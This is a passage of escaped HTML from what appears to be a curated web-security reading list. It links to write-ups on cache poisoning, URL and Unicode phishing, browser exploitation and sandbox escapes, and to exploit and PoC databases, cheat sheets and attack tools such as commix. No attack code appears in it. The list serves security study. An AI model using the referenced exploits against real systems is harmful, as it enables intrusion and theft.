data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9ieXBhc3Npbmctd2ViLWNhY2hlLXBvaXNvbmluZy1jb3VudGVybWVhc3VyZXM=\">Bypassing Web Cache Poisoning Countermeasures</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9hbGJpbm93YXg=\">@albinowax</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWIud2FsbGFybS5jb20vY2FjaGUtcG9pc29uaW5nLWFuZC1vdGhlci1kaXJ0eS10cmlja3MtMTIwNDY4ZjEwNTNm\">Cache poisoning and other dirty tricks</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93YWxsYXJtLmNvbS8=\">Wallarm</span>.</li>\n</ul>\n<p><a name=\"tricks-header-injection\"></a></p>\n<h3 id=\"header-injection\"><a class=\"anchor\" href=\"#header-injection\">#</a> Header Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuYmxpbmRzcG90c2VjdXJpdHkuY29tLzIwMTcvMDIvYWR2aXNvcnktamF2YXB5dGhvbi1mdHAtaW5qZWN0aW9ucy5odG1s\">Java/Python FTP Injections Allow for Firewall Bypass</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wbHVzLmdvb2dsZS5jb20vMTA1OTE3NjE4MDk5NzY2ODMxNTg5\">Timothy Morgan</span>.</li>\n</ul>\n<p><a name=\"tricks-url\"></a></p>\n<h3 id=\"url\"><a class=\"anchor\" href=\"#url\">#</a> URL</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub25jb21iYXRhbnQub3JnLzIwMTcvMTEvMDcvcHJvYmxlbXMtb2YtdXJscy8=\">Some Problems Of URLs</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub25jb21iYXRhbnQub3JnL2Fib3V0Lw==\">Chris Palmer</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3BocC5waC93eWRyb3BzL2Ryb3BzL1VSTCUyMEhhY2tpbmclMjAtJTIwJUU1JTg5JThEJUU3JUFCJUFGJUU3JThDJUE1JUU3JTkwJTkwJUU2JUI1JTgxLnBkZg==\">URL Hacking - 前端猥琐流</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3hzc2VjLmxvZnRlci5jb20v\">0x_Jin</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueHVkb25nei5jb20vYmxvZy8yMDE3L2lkbi1waGlzaGluZy8=\">Phishing with Unicode Domains</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueHVkb25nei5jb20v\">Xudong Zheng</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmdyc2VjLmNvbS9wb3N0MjAxNzAyMTkuaHRtbA==\">Unicode Domains are bad and you should feel bad for supporting them</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmdyc2VjLmNvbS8=\">VRGSEC</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuYmxhY2tmYW4ucnUvMjAxNy8wOS9kZXZ0d2l0dGVyY29tLXhzcy5odG1s\">[dev.twitter.com] XSS</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuYmxhY2tmYW4ucnUv\">Sergey Bobrov</span>.</li>\n</ul>\n<p><a name=\"tricks-deserialization\"></a></p>\n<h3 id=\"deserialization-2\"><a class=\"anchor\" href=\"#deserialization-2\">#</a> Deserialization</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmNjZ3JvdXAudHJ1c3QvdWsvYWJvdXQtdXMvbmV3c3Jvb20tYW5kLWV2ZW50cy9ibG9ncy8yMDE4L2F1Z3VzdC9hc3BuZXQtcmVzb3VyY2UtZmlsZXMtcmVzeC1hbmQtZGVzZXJpYWxpc2F0aW9uLWlzc3Vlcy8=\">ASP.NET resource files (.RESX) and deserialisation issues</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9pcnNkbA==\">@irsdl</span>.</li>\n</ul>\n<p><a name=\"tricks-oauth\"></a></p>\n<h3 id=\"oauth-2\"><a class=\"anchor\" href=\"#oauth-2\">#</a> OAuth</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW1vbGJhaWthci5jb20vZmFjZWJvb2stb2F1dGgtZnJhbWV3b3JrLXZ1bG5lcmFiaWxpdHkv\">Facebook OAuth Framework Vulnerability</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9BbW9sQmFpa2Fy\">@AmolBaikar</span>.</li>\n</ul>\n<p><a name=\"tricks-others\"></a></p>\n<h3 id=\"others\"><a class=\"anchor\" href=\"#others\">#</a> Others</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3plcm95dS54eXovMjAxOC8xMC8xMy9waHAtYXVkaXQtdGlwcy8=\">PHP 代码审计中的一些 Tips</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3plcm95dS54eXov\">z3r0yu</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2ZyZWUtY29kZS1jYW1wL21lc3Npbmctd2l0aC10aGUtZ29vZ2xlLWJ1Z2FuaXplci1zeXN0ZW0tZm9yLTE1LTYwMC1pbi1ib3VudGllcy01OGY4NmNjOWY5YTU=\">How I hacked Google’s bug tracking system itself for $15,600 in bounties</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0BhbGV4LmJpcnNhbg==\">@alex.birsan</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vU0hBUkUvc29tZS10cmlja3MtZnJvbS1teS1zZWNyZXQtZ3JvdXAuaHRtbA==\">Some Tricks From My Secret Group</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20v\">phithon</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vcHJlc2VudGF0aW9uL2QvMUN4MHZJMk16eTB6d2RUcmdpYzNTM1R3R01DcEgtUWhNVWRIVTFyM0FZZkkvZWRpdCNzbGlkZT1pZC5nMzVmMzkxMTkyXzA2NQ==\">CTF 比赛总是输？你还差点 Tricks!</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20v\">phithon</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ldmkxY2cubWUvYXJjaGl2ZXMvRG9tYWluX0Zyb250aW5nLmh0bWw=\">隱匿的攻擊之 - Domain Fronting</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ldmkxY2cubWUv\">Evi1cg</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaWRlbWljcy1zY2VwdGljaXNtL3dyaXRpbmcvYmxvYi9tYXN0ZXIvb25pb24tZG5zLWxlYWtzLm1k\">Inducing DNS Leaks in Onion Web Services</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VwaWRlbWljcy1zY2VwdGljaXNt\">@epidemics-scepticism</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC83MzVlOGYxNzQ2ZjA=\">web 狗要懂的内网端口转发</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vdS8xMjFiZjBmNmIzZDI=\">_阿烨_</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zMWduYWxjaGEwcy5naXRodWIuaW8vZHNwbC8yMDE4LzAzLzA3L1N0b3JlZC1YU1MtYW5kLVNTUkYtR29vZ2xlLmh0bWw=\">Stored XSS, and SSRF in Google using the Dataset Publishing Language</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zaWduYWxjaGFvcw==\">@signalchaos</span>.</li>\n</ul>\n<h2 id=\"browser-exploitation\"><a class=\"anchor\" href=\"#browser-exploitation\">#</a> Browser Exploitation</h2>\n<h3 id=\"frontend-like-sop-bypass-url-spoofing-and-something-like-that\"><a class=\"anchor\" href=\"#frontend-like-sop-bypass-url-spoofing-and-something-like-that\">#</a> Frontend (like SOP bypass, URL spoofing, and something like that)</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vc2hobmprL3RoZS13b3JsZC1vZi1zaXRlLWlzb2xhdGlvbi1hbmQtY29tcHJvbWlzZWQtcmVuZGVyZXI=\">The world of Site Isolation and compromised renderer</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zaGhuams=\">@shhnjk</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGVha2VyZGVjay5jb20vZmlsZWRlc2NyaXB0b3IvdGhlLWNvb2tpZS1tb25zdGVyLWluLXlvdXItYnJvd3NlcnM=\">The Cookie Monster in Your Browsers</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9maWxlZGVzY3JpcHRvcg==\">@filedescriptor</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmxhY2toYXQuY29tL2RvY3MvYXNpYS0xNi9tYXRlcmlhbHMvYXNpYS0xNi1CYWxvY2gtQnlwYXNzaW5nLUJyb3dzZXItU2VjdXJpdHktUG9saWNpZXMtRm9yLUZ1bi1BbmQtUHJvZml0LXdwLnBkZg==\">Bypassing Mobile Browser Security For Fun And Profit</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9AcmFmYXliYWxvY2g=\">@rafaybaloch</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qYW1lc2hmaXNoZXIuY29tLzIwMTkvMDQvMjcvdGhlLWluY2VwdGlvbi1iYXItYS1uZXctcGhpc2hpbmctbWV0aG9kLw==\">The inception bar: a new phishing method</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9qYW1lc2hmaXNoZXIuY29tLw==\">jameshfisher</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODcxOTc2Ng==\">浏览器漏洞挖掘思路</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d29zZWN1cml0eS5pby8=\">Twosecurity</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3hsYWIudGVuY2VudC5jb20vY24vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMTAvYnJvd3Nlci11aS1zZWN1cml0eS13aGl0ZXBhcGVyLnBkZg==\">Browser UI Security 技术白皮书</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3hsYWIudGVuY2VudC5jb20v\">腾讯玄武实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cucG9ydHN3aWdnZXIubmV0LzIwMTYvMTEvanNvbi1oaWphY2tpbmctZm9yLW1vZGVybi13ZWIuaHRtbA==\">JSON hijacking for the modern web</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">portswigger</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0V4cGxvaXRXYXJlTGFicy9waG90b3MvYS4zNjE4NTQxODM4Nzg0NjIuODQ1NDQuMzM4ODMyMzg5NTEzOTc1LzEzNzg1Nzk2NDg4NzI1NzIvP3R5cGU9MyZhbXA7dGhlYXRlcg==\">IE11 Information disclosure - local file detection</span> - Written by James Lee.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYnJva2VuYnJvd3Nlci5jb20vc29wLWJ5cGFzcy11eHNzLXN0ZWFsaW5nLWNyZWRlbnRpYWxzLXByZXR0eS1mYXN0Lw==\">SOP bypass / UXSS – Stealing Credentials Pretty Fast (Edge)</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9tYWdpY21hYzIwMDA=\">Manuel</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibzBvbS5ydS9zYWZhcmktY2xpZW50LXNpZGU=\">Особенности Safari в client-side атаках</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibzBvbS5ydS9hdXRob3IvYWRtaW4=\">Bo0oM</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibzBvbS5ydS9zYWZhcmktY2xpZW50LXNpZGU=\">Особенности Safari в client-side атаках</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibzBvbS5ydS9hdXRob3IvYWRtaW4=\">Bo0oM</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdvb2dsZS5jb20vZG9jdW1lbnQvZC8xY2JMLVgwa1ZfdFE1ckw4WEozbFhrVi1qMHB0X0NmVHU1WlN6WXJuY1BEYy8=\">How do we Stop Spilling the Beans Across Origins?</span> - Written by <a href=\"aaj@google.com\">aaj at google.com</a> and <a href=\"mkwst@google.com\">mkwst at google.com</a>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8yMDE4LzA2L3NldHRpbmctYXJiaXRyYXJ5LXJlcXVlc3QtaGVhZGVycy1pbi5odG1s\">Setting arbitrary request headers in Chromium via CRLF injection</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmJlbnRrb3dza2kuaW5mby8=\">Michał Bentkowski</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJub29uLmNvbS9pbS1oYXJ2ZXN0aW5nLWNyZWRpdC1jYXJkLW51bWJlcnMtYW5kLXBhc3N3b3Jkcy1mcm9tLXlvdXItc2l0ZS1oZXJlLXMtaG93LTlhOGNiMzQ3YzViNQ==\">I’m harvesting credit card numbers and passwords from your site. Here’s how.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJub29uLmNvbS9AZGF2aWQuZ2lsYmVydHNvbg==\">David Gilbertson</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrZXJvbmUuY29tL3JlcG9ydHMvMTg4MDg2\">Sending arbitrary IPC messages via overriding Function.prototype.apply</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9raW51Z2F3YW1hc2F0bw==\">@kinugawamasato</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9haHVzc2FtLm1lL1Rha2UtQWR2YW50YWdlLW9mLU91dC1vZi1TY29wZS1Eb21haW5zLWluLUJ1Zy1Cb3VudHkv\">Take Advantage of Out-of-Scope Domains in Bug Bounty Programs</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9BYmR1bGFoaHVzYW0=\">@Abdulahhusam</span>.</li>\n</ul>\n<h3 id=\"backend-core-of-browser-implementation-and-often-refers-to-c-or-c-part\"><a class=\"anchor\" href=\"#backend-core-of-browser-implementation-and-often-refers-to-c-or-c-part\">#</a> Backend (core of Browser implementation, and often refers to C or C++ part)</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWJyLmNvbS9lbi9jb21wYW55L2Ryd2ViL2Jsb2cvNDUyMDc2Lw==\">Breaking UC Browser</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZHJ3ZWIucnUv\">Доктор Веб</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5waHJhY2sub3JnL3BhcGVycy9hdHRhY2tpbmdfamF2YXNjcmlwdF9lbmdpbmVzLmh0bWw=\">Attacking JavaScript Engines - A case study of JavaScriptCore and CVE-2016-4622</span> - Written by <a href=\"phrack@saelo.net\">phrack@saelo.net</a>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2dzLjM2MC5jbi8zNjBzYWZlLzIwMTYvMTEvMjkvdGhyZWUtcm9hZHMtbGVhZC10by1yb21lLTIv\">Three roads lead to Rome</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ob2x5bm9w\">@holynop</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWxiZWNhZi5jb20vMjAxNy8wNS8yNC9leHBsb2l0aW5nLWEtdjgtb29iLXdyaXRlLw==\">Exploiting a V8 OOB write.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oYWxiZWNhZg==\">@halbecaf</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy5zZWN1cml0ZWFtLmNvbS9pbmRleC5waHAvYXJjaGl2ZXMvMzM3OQ==\">SSD Advisory – Chrome Turbofan Remote Code Execution</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy5zZWN1cml0ZWFtLmNvbS8=\">SecuriTeam Secure Disclosure (SSD)</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmJsdWVmcm9zdHNlY3VyaXR5LmRlL2ZpbGVzL0xvb2tfTW9tX0lfRG9udF9Vc2VfU2hlbGxjb2RlLVdQLnBkZg==\">Look Mom, I don't use Shellcode - Browser Exploitation Case Study for Internet Explorer 11</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3R3aXR0ZXIuY29tL21vcml0emo=\">@moritzj</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Jsb2cvMjAxOC8yLzEyL3B1c2hpbmctd2Via2l0cy1idXR0b25zLXdpdGgtYS1tb2JpbGUtcHduMm93bi1leHBsb2l0\">PUSHING WEBKIT'S BUTTONS WITH A MOBILE PWN2OWN EXPLOIT</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS93YW5kZXJpbmdnbGl0Y2g=\">@wanderingglitch</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJldDIuaW8vMjAxOC8wNi8wNS9wd24yb3duLTIwMTgtZXhwbG9pdC1kZXZlbG9wbWVudC8=\">A Methodical Approach to Browser Exploitation</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJldDIuaW8v\">RET2 SYSTEMS, INC</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2FyLWUuZ2l0aHViLmlvL2Jsb2cvMjAxOC8wNy8xNC9jdmUtMjAxNy0yNDQ2LW9yLWpzY2pzZ2xvYmFsb2JqZWN0aXNoYXZpbmdhYmFkdGltZS8=\">CVE-2017-2446 or JSC::JSGlobalObject::isHavingABadTime.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2FyLWUuZ2l0aHViLmlvLw==\">Diary of a reverse-engineer</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yMDM3MjEuaHRtbA==\">从一道 CTF 题零基础学 V8 漏洞利用</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXV0aG9yL3dhbGtlcmZ1eg==\">walkerfuz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGVvcmkuaW8vcmVzZWFyY2gvZXNjYXBpbmctY2hyb21lLXNhbmRib3g=\">CLEANLY ESCAPING THE CHROME SANDBOX</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS90amJlY2tlcl8=\">@tjbecker_</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJldDIuaW8vMjAxOC8wNi8wNS9wd24yb3duLTIwMTgtZXhwbG9pdC1kZXZlbG9wbWVudC8=\">A Methodical Approach to Browser Exploitation</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9QYXRyaWNrQmllcm5hdA==\">@PatrickBiernat</span>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9nYWFzZWRlbGVu\">@gaasedelen</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9pdHN6bjEz\">@itszn13</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2hlY2stdGhlLXBhY2tldC9ob3ctaS1nb3QtbXktZmlyc3QtYmlnLWJvdW50eS1wYXlvdXQtd2l0aC10ZXNsYS04ZDI4YjUyMDE2MmQ=\">How I got my first big bounty payout with Tesla</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0Bjai5mYWlyaGVhZA==\">@cj.fairhead</span>.</li>\n</ul>\n<h2 id=\"pocs\"><a class=\"anchor\" href=\"#pocs\">#</a> PoCs</h2>\n<p><a name=\"pocs-database\"></a></p>\n<h3 id=\"database\"><a class=\"anchor\" href=\"#database\">#</a> Database</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3R1bnovanMtdnVsbi1kYg==\">js-vuln-db</span> - Collection of JavaScript engine CVEs with PoCs by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3R1bno=\">@tunz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ni9hd2Vzb21lLWN2ZS1wb2M=\">awesome-cve-poc</span> - Curated list of CVE PoCs by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ng==\">@qazbnm456</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvZmZlZWhiL1NvbWUtUG9DLW9SLUV4UA==\">Some-PoC-oR-ExP</span> - 各种漏洞 poc、Exp 的收集或编写 by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvZmZlZWhi\">@coffeehb</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01ldG5ldy91eHNzLWRi\">uxss-db</span> - Collection of UXSS CVEs with PoCs by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01ldG5ldw==\">@Metnew</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGxvaXR1cy5jb20v\">SPLOITUS</span> - Exploits &amp; Tools Search Engine by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9pX2JvMG9t\">@i_bo0om</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20v\">Exploit Database</span> - ultimate archive of Exploits, Shellcode, and Security Papers by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub2ZmZW5zaXZlLXNlY3VyaXR5LmNvbS8=\">Offensive Security</span>.</li>\n</ul>\n<h2 id=\"cheetsheets\"><a class=\"anchor\" href=\"#cheetsheets\">#</a> Cheetsheets</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9kb3dubG9hZC9ib29rL3NlY3VyaXR5LWdlZWstMjAxNi1BLnBkZg==\">Security Geek 2016 - Part. A</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9kb3dubG9hZC9ib29rL3NlY3VyaXR5LWdlZWstMjAxNi1CLnBkZg==\">Security Geek 2016 - Part. B</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9kb3dubG9hZC9ib29rL3NlY3VyaXR5LWdlZWstMjAxNy1xMS5wZGY=\">Security Geek 2017 - Q1</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9kb3dubG9hZC9ib29rL3NlY3VyaXR5LWdlZWstMjAxNy1xMi5wZGY=\">Security Geek 2017 - Q2</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9kb3dubG9hZC9ib29rL3NlY3VyaXR5LWdlZWstMjAxNy1xMy5wZGY=\">Security Geek 2017 - Q3</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGF0aWMuYW5xdWFua2UuY29tL2Rvd25sb2FkL2Ivc2VjdXJpdHktZ2Vlay0yMDE3LXE0LnBkZg==\">Security Geek 2017 - Q4</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFucHViLmNvbS94c3M=\">XSS Cheat Sheet - 2018 Edition</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9icnV0ZWxvZ2lj\">@brutelogic</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3VwcHVzYWlraXJhbi9hd2Vzb21lLWN0Zi1jaGVhdHNoZWV0\">Capture the Flag CheatSheet</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3VwcHVzYWlraXJhbg==\">@uppusaikiran</span>.</li>\n</ul>\n<h2 id=\"tools\"><a class=\"anchor\" href=\"#tools\">#</a> Tools</h2>\n<p><a name=\"tools-auditing\"></a></p>\n<h3 id=\"auditing\"><a class=\"anchor\" href=\"#auditing\">#</a> Auditing</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FsZnJlc2NvL3Byb3dsZXI=\">prowler</span> - Tool for AWS security assessment, auditing and hardening by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FsZnJlc2Nv\">@Alfresco</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hlaG5vcGUvc2x1cnA=\">slurp</span> - Evaluate the security of S3 buckets by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hlaG5vcGU=\">@hehnope</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhaHd1bC9hMnN2\">A2SV</span> - Auto Scanning to SSL Vulnerability by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhaHd1bA==\">@hahwul</span>.</li>\n</ul>\n<p><a name=\"tools-command-injection\"></a></p>\n<h3 id=\"command-injection-2\"><a class=\"anchor\" href=\"#command-injection-2\">#</a> Command Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvbW1peHByb2plY3QvY29tbWl4\">commix</span> - Automated All-in-One OS command injection and exploitation tool by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvbW1peHByb2plY3Q=\">@commixproject</span>.</li>\n</ul>\n<p><a name=\"tools-reconnaissance\"></a></p>\n<h3 id=\"reconnaissance\"><a class=\"anchor\" href=\"#reconnaissance\">#</a> Reconnaissance</h3>\n<p><a name=\"tools-osint\"></a></p>\n<h4 id=\"osint-open-source-intelligence\"><a class=\"anchor\" href=\"#osint-open-source-intelligence\">#</a> OSINT - Open-Source Intelligence</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2hvZGFuLmlvLw==\">Shodan</span> - Shodan is the world's first search engine for Internet-connected devices by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zaG9kYW5ocQ==\">@shodanhq</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZW5zeXMuaW8v\">Censys</span> - Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet by <span class=\"exturl\" data-url=\"aHR0cHM6Ly91bWljaC5lZHUv\">University of Michigan</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly91cmxzY2FuLmlvLw==\">urlscan.io</span> - Service which analyses websites and the resources they request by <span class=\"exturl\" 